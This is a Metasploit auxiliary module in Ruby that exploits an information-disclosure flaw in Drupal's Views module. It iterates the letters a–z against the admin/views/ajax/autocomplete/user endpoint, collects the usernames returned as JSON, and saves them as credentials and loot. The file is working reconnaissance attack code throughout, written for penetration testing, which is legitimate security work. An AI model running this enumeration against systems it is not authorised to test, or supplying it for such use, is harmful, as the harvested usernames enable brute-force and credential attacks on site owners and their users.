##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanServer
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal Views Module Users Enumeration',
      'Description'    => %q{
        This module exploits an information disclosure vulnerability in the 'Views'
        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'
      },
      'Author'         =>
        [
          'Justin Klein Keane', #Original Discovery
          'Robin Francois <rof[at]navixia.com>',
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://www.madirish.net/node/465'],
        ],
      'DisclosureDate' => 'Jul 2 2010'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, "Drupal Path", "/"])
      ])
  end

  def base_uri
    @base_uri ||= normalize_uri("#{target_uri.path}/?q=admin/views/ajax/autocomplete/user/")
  end

  def check_host(ip)
    res = send_request_cgi(
      'uri'     => base_uri,
      'method'  => 'GET',
      'headers' => { 'Connection' => 'Close' }
    )

    unless res
      return Exploit::CheckCode::Unknown
    end

    if res.body.include?('Access denied')
      # This probably means the Views Module actually isn't installed
      print_error("Access denied")
      return Exploit::CheckCode::Safe
    elsif res.message != 'OK' || res.body != '[  ]'
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    # Check if remote host is available or appears vulnerable
    unless check_host(ip) == Exploit::CheckCode::Appears
      print_error("#{ip} does not appear to be vulnerable, will not continue")
      return
    end

    print_status("Begin enumerating users at #{vhost}")

    results = []
    ('a'..'z').each do |l|
      vprint_status("Iterating on letter: #{l}")

      res = send_request_cgi(
        'uri'     => "#{base_uri}#{l}",
        'method'  => 'GET',
        'headers' => { 'Connection' => 'Close' }
      )

      if res && res.message == 'OK'
        begin
          user_list = JSON.parse(res.body)
        rescue JSON::ParserError => e
          elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
          return []
        end
        if user_list.empty?
          vprint_error("Not found with: #{l}")
        else
          vprint_good("Found: #{user_list}")
          results << user_list.flatten.uniq
        end
      else
        print_error("Unexpected results from server")
        return
      end
    end
    results = results.flatten.uniq
    print_status("Done. #{results.length} usernames found...")
    results.each do |user|
      print_good("Found User: #{user}")

      report_cred(
        ip: Rex::Socket.getaddress(datastore['RHOST']),
        port: datastore['RPORT'],
        user: user,
        proof: base_uri
      )
    end

    results = results * "\n"
    p = store_loot(
      'drupal_user',
      'text/plain',
      Rex::Socket.getaddress(datastore['RHOST']),
      results.to_s,
      'drupal_user.txt'
    )
    print_status("Usernames stored in: #{p}")
  end
end
